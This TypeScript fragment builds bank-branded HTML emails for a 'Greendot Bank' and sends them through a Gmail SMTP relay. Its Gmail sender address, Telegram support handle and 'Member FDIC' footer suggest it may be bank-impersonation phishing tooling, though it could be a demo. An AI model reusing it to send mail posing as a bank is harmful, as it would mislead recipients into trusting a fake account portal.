    const b = bannerColors[announcementCategory] || bannerColors.general;

    headerTitle = 'Official Announcement';
    headerSubtitle = subject;

    bodyContent = `
      <div style="background-color: ${b.bg}; color: ${b.text}; font-size: 11px; font-weight: 800; letter-spacing: 1px; padding: 6px 12px; border-radius: 6px; display: inline-block; margin-bottom: 16px;">
        ${b.label}
      </div>
      <h2 style="color: #ffffff; margin: 0 0 16px; font-size: 20px; font-weight: 700;">${subject}</h2>
      <div style="color: #cbd5e1; font-size: 15px; line-height: 1.7; margin-bottom: 24px;">
        ${content || 'Important update regarding your Greendot Bank accounts and services.'}
      </div>
      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="margin: 28px 0 10px;">
        <tr>
          <td align="center">
            <a href="${dashboardUrl}" style="background-color: #10b981; color: #ffffff; text-decoration: none; padding: 12px 28px; font-weight: 700; font-size: 14px; border-radius: 8px; display: inline-block;">
              Open Account Portal
            </a>
          </td>
        </tr>
      </table>
    `;
  } else {
    bodyContent = `
      <h2 style="color: #ffffff; margin: 0 0 16px; font-size: 20px; font-weight: 700;">${subject}</h2>
      <div style="color: #cbd5e1; font-size: 15px; line-height: 1.7; margin-bottom: 24px;">
        ${content || ''}
      </div>
      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="margin: 28px 0 10px;">
        <tr>
          <td align="center">
            <a href="${dashboardUrl}" style="background-color: #10b981; color: #ffffff; text-decoration: none; padding: 12px 28px; font-weight: 700; font-size: 14px; border-radius: 8px; display: inline-block;">
              Visit Greendot Bank
            </a>
          </td>
        </tr>
      </table>
    `;
  }

  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${subject}</title>
</head>
<body style="margin: 0; padding: 32px 16px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #0b0f19; color: #f8fafc;">
  <table width="100%" border="0" cellspacing="0" cellpadding="0">
    <tr>
      <td align="center">
        <!-- Main Dark Charcoal Card Container -->
        <table width="100%" border="0" cellspacing="0" cellpadding="0" style="max-width: 600px; background-color: #1e293b; border-radius: 16px; overflow: hidden; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6); border: 1px solid #334155;">
          
          <!-- Vibrant Green Header Block -->
          <tr>
            <td style="background-color: #10b981; background-image: linear-gradient(135deg, #10b981 0%, #059669 100%); padding: 30px 28px; text-align: center; color: #ffffff;">
              <table width="100%" border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td align="center">
                    <div style="display: inline-block; background: rgba(0, 0, 0, 0.15); padding: 5px 14px; border-radius: 20px; font-size: 11px; font-weight: 800; letter-spacing: 1.5px; text-transform: uppercase; color: #ffffff; margin-bottom: 8px;">
                      Greendot Bank &bull; Secure Banking
                    </div>
                    <h1 style="margin: 4px 0 6px; font-size: 24px; font-weight: 800; letter-spacing: -0.5px; color: #ffffff;">
                      ${headerTitle}
                    </h1>
                    <p style="margin: 0; font-size: 14px; color: #d1fae5; font-weight: 500;">
                      ${headerSubtitle}
                    </p>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <!-- Inner Card Surface -->
          <tr>
            <td style="padding: 32px 28px; background-color: #1e293b;">
              ${bodyContent}
            </td>
          </tr>

          <!-- Support Footer -->
          <tr>
            <td style="background-color: #0f172a; padding: 24px 28px; border-top: 1px solid #334155; color: #94a3b8; font-size: 12px; line-height: 1.6; text-align: center;">
              <div style="color: #ffffff; font-weight: 700; font-size: 13px; margin-bottom: 4px;">
                Greendot Banking Support Desk
              </div>
              <div style="color: #94a3b8; margin-bottom: 12px;">
                Direct inquiries to: <a href="mailto:${supportEmail}" style="color: #34d399; text-decoration: none; font-weight: 600;">${supportEmail}</a>
                &bull; Phone: <span style="color: #e2e8f0; font-weight: 600;">${supportPhone}</span>
                &bull; Telegram: <span style="color: #e2e8f0; font-weight: 600;">${telegramHandle}</span>
              </div>
              <div style="color: #64748b; font-size: 11px; border-top: 1px solid #1e293b; padding-top: 12px; margin-top: 8px;">
                100 Financial Plaza, New York, NY 10005 &bull; Member FDIC &bull; Equal Housing Lender &bull; &copy; 2026 Greendot Bank. All rights reserved.
              </div>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>
  `.trim();
}

/**
 * Universal helper to send emails via backend Gmail SMTP relay (/api/send-email).
 * Always dispatches with sender: Greendot Bank Support <greendot.bank.supportmail@gmail.com>
 */
export async function sendEmailApi(options: {
  to: string;
  subject: string;
  html: string;
  text?: string;
  from?: string;
}): Promise<{ success: boolean; messageId?: string; provider?: string; error?: string }> {
  const sender = options.from || TRANSACTIONAL_SENDER;

  try {
    const res = await fetch('/api/send-email', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        ...options,
        from: sender,
      }),
    });

    const data = await safeParseResponse<{ success?: boolean; messageId?: string; provider?: string; error?: string }>(res);
    if (data?.success) {
      return { success: true, messageId: data.messageId, provider: data.provider || 'gmail-smtp' };
    }
    return {
      success: false,
      error: data?.error || 'Failed to dispatch email via Gmail SMTP relay',
    };
  } catch (err: any) {
    console.warn('sendEmailApi dispatch error:', err);
    return { success: false, error: err?.message || 'Network error' };
  }
}
